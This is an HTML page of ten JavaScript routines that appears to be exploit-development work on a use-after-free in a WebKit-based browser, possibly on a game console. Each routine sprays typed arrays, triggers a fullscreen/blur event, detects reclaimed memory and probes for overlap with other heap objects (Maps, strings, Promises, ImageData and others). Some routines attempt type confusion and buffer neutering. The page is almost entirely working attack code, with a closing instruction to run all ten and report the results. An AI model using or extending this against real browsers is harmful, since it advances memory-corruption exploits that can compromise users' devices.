<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>UAF Escalation</title>
</head>
<body>

<h1>UAF ESCALATION - 10 TECHNIQUES</h1>

<h2>TECH 1: ArrayBuffer Neutering</h2>
<button onclick="t1()">RUN</button>
<div id="r1"></div>
<script>
function t1() {
    const r = document.getElementById('r1');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        r.innerHTML = 'UAF OK<br>';
        
        // Try to transfer/neuter the buffer
        r.innerHTML += 'Testing ArrayBuffer.transfer:<br>';
        
        try {
            const buf = c.buffer;
            r.innerHTML += 'Original buffer byteLength: ' + buf.byteLength + '<br>';
            
            // Try neutering via transfer (if supported)
            if(typeof ArrayBuffer.transfer === 'function') {
                const newBuf = ArrayBuffer.transfer(buf, 128);
                r.innerHTML += 'Transferred to 128 bytes<br>';
                r.innerHTML += 'Original byteLength: ' + buf.byteLength + '<br>';
                r.innerHTML += 'New byteLength: ' + newBuf.byteLength + '<br>';
                
                if(buf.byteLength === 0) {
                    r.innerHTML += '<b>NEUTERED! Original buffer detached</b><br>';
                }
                
                // Try accessing neutered
                try {
                    const v = new DataView(buf);
                    const val = v.getUint8(0);
                    r.innerHTML += 'Read from neutered: ' + val + '<br>';
                } catch(e) {
                    r.innerHTML += 'Neutered access error: ' + e.message + '<br>';
                }
                
            } else {
                r.innerHTML += 'ArrayBuffer.transfer not supported<br>';
            }
            
        } catch(e) {
            r.innerHTML += 'Error: ' + e.message + '<br>';
        }
    };
}
</script>

<hr>

<h2>TECH 2: Shared ArrayBuffer</h2>
<button onclick="t2()">RUN</button>
<div id="r2"></div>
<script>
function t2() {
    const r = document.getElementById('r2');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    // Try creating SharedArrayBuffers
    r.innerHTML += 'Testing SharedArrayBuffer:<br>';
    
    try {
        const sab = new SharedArrayBuffer(64);
        r.innerHTML += 'SharedArrayBuffer created: ' + sab.byteLength + ' bytes<br>';
        
        for(let i = 0; i < 5000; i++) {
            let a = new Float64Array(8);
            a[0] = i;
            arrays.push(a);
        }
        
        if(document.documentElement.webkitRequestFullscreen) 
            document.documentElement.webkitRequestFullscreen();
        
        window.onblur = function() {
            const spray = [];
            
            // Spray SharedArrayBuffers
            for(let i = 0; i < 3000; i++) {
                try {
                    let s = new SharedArrayBuffer(80);
                    spray.push(s);
                } catch(e) {}
            }
            
            // Regular spray
            for(let i = 0; i < 5000; i++) {
                let s = new Float64Array(10);
                s.fill(P);
                spray.push(s);
            }
            
            let c = null;
            for(let a of arrays) {
                if(a[0] === P) { c = a; break; }
            }
            
            if(!c) { r.innerHTML += 'FAIL<br>'; return; }
            
            r.innerHTML += 'UAF OK<br>';
            r.innerHTML += 'SharedArrayBuffer spray: ' + spray.filter(s => s instanceof SharedArrayBuffer).length + '<br>';
            
            // Check if corrupted buffer overlaps with SAB
            const v = new DataView(c.buffer);
            let hasNonZero = false;
            for(let i = 0; i < 64; i += 8) {
                const val = v.getBigUint64(i, true);
                if(val !== 0n && val !== 0x4141414141414141n) {
                    hasNonZero = true;
                    r.innerHTML += 'Found non-standard value at ' + i + ': 0x' + val.toString(16) + '<br>';
                }
            }
            
            if(hasNonZero) {
                r.innerHTML += '<b>POSSIBLE SAB OVERLAP</b><br>';
            }
        };
        
    } catch(e) {
        r.innerHTML += 'SharedArrayBuffer error: ' + e.message + '<br>';
    }
}
</script>

<hr>

<h2>TECH 3: Map/Set Confusion</h2>
<button onclick="t3()">RUN</button>
<div id="r3"></div>
<script>
function t3() {
    const r = document.getElementById('r3');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    // Create Maps and Sets
    const maps = [];
    const sets = [];
    
    for(let i = 0; i < 1000; i++) {
        let m = new Map();
        m.set(i, i * 2);
        maps.push(m);
        
        let s = new Set();
        s.add(i);
        sets.push(s);
    }
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        
        // Spray Maps/Sets
        for(let i = 0; i < 2000; i++) {
            let m = new Map();
            for(let j = 0; j < 10; j++) {
                m.set(j, P);
            }
            spray.push(m);
        }
        
        for(let i = 0; i < 5000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        r.innerHTML = 'UAF OK<br>';
        
        // Check if Map/Set overlaps
        r.innerHTML += 'Checking Map/Set overlap:<br>';
        
        const v = new DataView(c.buffer);
        
        // Write marker
        v.setBigUint64(0, 0x1234567890ABCDEFn, true);
        
        // Scan Maps
        let mapFound = 0;
        for(let m of spray) {
            if(m instanceof Map) {
                m.forEach((val, key) => {
                    if(typeof val === 'number') {
                        const buf = new ArrayBuffer(8);
                        new Float64Array(buf)[0] = val;
                        const hex = new BigUint64Array(buf)[0];
                        if(hex === 0x1234567890ABCDEFn) {
                            mapFound++;
                        }
                    }
                });
            }
        }
        
        r.innerHTML += 'Maps with marker: ' + mapFound + '<br>';
        
        if(mapFound > 0) {
            r.innerHTML += '<b>MAP OVERLAP DETECTED!</b><br>';
        }
    };
}
</script>

<hr>

<h2>TECH 4: RegExp Spray</h2>
<button onclick="t4()">RUN</button>
<div id="r4"></div>
<script>
function t4() {
    const r = document.getElementById('r4');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        
        // Spray RegExp objects (different allocator)
        for(let i = 0; i < 5000; i++) {
            let re = new RegExp('A{' + i + '}', 'g');
            spray.push(re);
        }
        
        for(let i = 0; i < 3000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        r.innerHTML = 'UAF OK<br>';
        
        const v = new DataView(c.buffer);
        
        // Look for RegExp patterns
        r.innerHTML += 'Scanning for RegExp data:<br>';
        
        for(let i = 0; i < 64; i += 4) {
            const dword = v.getUint32(i, true);
            const char = String.fromCharCode(dword & 0xFF);
            
            if(char === 'A' || (dword & 0xFF) === 0x41) {
                r.innerHTML += 'Found "A" at offset ' + i + '<br>';
            }
        }
    };
}
</script>

<hr>

<h2>TECH 5: String Confusion</h2>
<button onclick="t5()">RUN</button>
<div id="r5"></div>
<script>
function t5() {
    const r = document.getElementById('r5');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        
        // Spray large strings
        const marker = 'DEADBEEF';
        for(let i = 0; i < 5000; i++) {
            let str = marker.repeat(100) + i;
            spray.push(str);
        }
        
        for(let i = 0; i < 3000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        r.innerHTML = 'UAF OK<br>';
        
        const v = new DataView(c.buffer);
        
        // Look for string data
        r.innerHTML += 'Looking for string markers:<br>';
        
        for(let i = 0; i < 64; i += 4) {
            const dword = v.getUint32(i, true);
            
            // Check for ASCII 'DEAD'
            if(dword === 0x44414544) {
                r.innerHTML += '<b>Found "DEAD" at offset ' + i + '</b><br>';
            }
            
            // Check for ASCII 'BEEF'
            if(dword === 0x46454542) {
                r.innerHTML += '<b>Found "BEEF" at offset ' + i + '</b><br>';
            }
        }
    };
}
</script>

<hr>

<h2>TECH 6: Promise Spray</h2>
<button onclick="t6()">RUN</button>
<div id="r6"></div>
<script>
function t6() {
    const r = document.getElementById('r6');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        
        // Spray Promises (JSCell allocator)
        for(let i = 0; i < 5000; i++) {
            let p = new Promise((resolve) => {
                resolve(i);
            });
            spray.push(p);
        }
        
        for(let i = 0; i < 3000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        r.innerHTML = 'UAF OK<br>';
        
        const v = new DataView(c.buffer);
        
        // Look for JSCell headers
        r.innerHTML += 'Looking for JSCell patterns:<br>';
        
        for(let i = 0; i < 64; i += 8) {
            const qword = v.getBigUint64(i, true);
            
            // Check for JSCell-like structures
            // StructureID usually in range 0x100-0x10000
            const structID = Number(qword & 0xFFFFFFFFn);
            
            if(structID > 0x100 && structID < 0x10000) {
                r.innerHTML += 'Possible JSCell at ' + i + ': 0x' + qword.toString(16) + '<br>';
            }
        }
    };
}
</script>

<hr>

<h2>TECH 7: Worker Spray</h2>
<button onclick="t7()">RUN</button>
<div id="r7"></div>
<script>
function t7() {
    const r = document.getElementById('r7');
    r.innerHTML = 'Testing Worker support:<br>';
    
    if(typeof Worker === 'undefined') {
        r.innerHTML += 'Workers not supported<br>';
        return;
    }
    
    r.innerHTML += 'Workers supported - Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        
        // Spray Workers
        try {
            for(let i = 0; i < 10; i++) {
                let w = new Worker('data:text/javascript,self.postMessage(' + i + ')');
                spray.push(w);
            }
            r.innerHTML += 'Created ' + spray.filter(w => w instanceof Worker).length + ' workers<br>';
        } catch(e) {
            r.innerHTML += 'Worker creation error: ' + e.message + '<br>';
        }
        
        for(let i = 0; i < 5000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML += 'FAIL<br>'; return; }
        
        r.innerHTML += 'UAF OK with Workers<br>';
    };
}
</script>

<hr>

<h2>TECH 8: Symbol Spray</h2>
<button onclick="t8()">RUN</button>
<div id="r8"></div>
<script>
function t8() {
    const r = document.getElementById('r8');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        
        // Spray Symbols
        for(let i = 0; i < 5000; i++) {
            let sym = Symbol('marker_' + i);
            spray.push(sym);
        }
        
        for(let i = 0; i < 3000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        r.innerHTML = 'UAF OK<br>';
        
        const v = new DataView(c.buffer);
        
        // Look for Symbol strings
        r.innerHTML += 'Looking for Symbol markers:<br>';
        
        for(let i = 0; i < 56; i += 4) {
            const dword = v.getUint32(i, true);
            
            // 'mark' in ASCII
            if(dword === 0x6b72616d) {
                r.innerHTML += '<b>Found "mark" at offset ' + i + '</b><br>';
            }
        }
    };
}
</script>

<hr>

<h2>TECH 9: Uint8ClampedArray Confusion</h2>
<button onclick="t9()">RUN</button>
<div id="r9"></div>
<script>
function t9() {
    const r = document.getElementById('r9');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        
        // Spray Uint8ClampedArray (Canvas uses this)
        for(let i = 0; i < 5000; i++) {
            let u8c = new Uint8ClampedArray(64);
            u8c.fill(0x41);
            spray.push(u8c);
        }
        
        for(let i = 0; i < 3000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        r.innerHTML = 'UAF OK<br>';
        
        // Try type confusion
        r.innerHTML += 'Testing type confusion:<br>';
        
        try {
            const u8view = new Uint8Array(c.buffer);
            r.innerHTML += 'Uint8Array view created<br>';
            r.innerHTML += 'Length: ' + u8view.length + '<br>';
            
            // Write bytes
            for(let i = 0; i < 8; i++) {
                u8view[i] = 0x42 + i;
            }
            
            // Read as Float64
            const asFloat = c[0];
            const buf = new ArrayBuffer(8);
            new Float64Array(buf)[0] = asFloat;
            const hex = new BigUint64Array(buf)[0];
            
            r.innerHTML += 'As hex: 0x' + hex.toString(16) + '<br>';
            
            if(hex !== 0x4141414141414141n) {
                r.innerHTML += '<b>TYPE CONFUSION WORKING</b><br>';
            }
            
        } catch(e) {
            r.innerHTML += 'Error: ' + e.message + '<br>';
        }
    };
}
</script>

<hr>

<h2>TECH 10: ImageData Spray</h2>
<button onclick="t10()">RUN</button>
<div id="r10"></div>
<script>
function t10() {
    const r = document.getElementById('r10');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        
        // Spray ImageData (Canvas API)
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            
            for(let i = 0; i < 2000; i++) {
                let imgData = ctx.createImageData(8, 8);
                imgData.data.fill(0x41);
                spray.push(imgData);
            }
            
            r.innerHTML = 'ImageData spray: ' + spray.length + '<br>';
            
        } catch(e) {
            r.innerHTML += 'Canvas error: ' + e.message + '<br>';
        }
        
        for(let i = 0; i < 5000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML += 'FAIL<br>'; return; }
        
        r.innerHTML += 'UAF OK<br>';
        
        // Check for ImageData overlap
        const v = new DataView(c.buffer);
        let found41 = 0;
        
        for(let i = 0; i < 64; i++) {
            if(v.getUint8(i) === 0x41) {
                found41++;
            }
        }
        
        r.innerHTML += 'Bytes with 0x41: ' + found41 + '/64<br>';
        
        if(found41 > 8) {
            r.innerHTML += '<b>POSSIBLE IMAGEDATA OVERLAP</b><br>';
        }
    };
}
</script>

<p>Execute all 10 and report which (if any) show overlap</p>

</body>
</html>
